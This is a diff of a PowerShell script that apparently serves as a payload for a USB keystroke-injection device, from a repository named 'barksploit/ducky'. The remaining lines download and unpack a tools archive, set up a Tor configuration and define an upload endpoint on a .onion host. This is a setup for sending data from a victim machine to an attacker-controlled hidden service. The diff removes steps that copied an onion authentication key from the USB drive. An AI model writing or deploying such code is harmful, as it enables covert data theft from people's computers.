@@ -8,13 +8,6 @@ $onionURL = "rokyn4z5yzjmbwb5pr5mdes2rmogz2vzfmrvt4mx6ur5mum5bqytkcad.onion"
 $uploadURL = $onionURL + "/upload.php"
 $logFile = "$dropPath\tools\tor\tor.log"
 $duckyLabel = "CIRCUITPY"
-$privKeyDest = $dropPath + "\tools\tor\auth\auth.private"
-
-$drive = Get-Volume | Where-Object { $_.FileSystemLabel -eq $duckyLabel }
-
-$drivePath = "$($drive.DriveLetter):\"
-
-$privKey = $drivePath + "\auth.private"
 
 # Set the download URL
 $toolsURL = "https://raw.githubusercontent.com/barksploit/ducky/refs/heads/master/tools.zip"
@@ -31,13 +24,8 @@ Invoke-WebRequest -Uri $toolsURL -OutFile $zipFile
 # Extract it
 Expand-Archive -Path $zipFile -DestinationPath $dropPath -Force
 
-New-Item -ItemType Directory -Path (Split-Path $privKeyDest) -Force | Out-Null
-
-Copy-Item -Path $privKey -Destination $privKeyDest -Force
-
 Set-Content -Path $torrcPath -Value @"
 SocksPort 9050
-ClientOnionAuthDir $dropPath\tools\tor\auth
 Log notice file $logFile
 "@
 
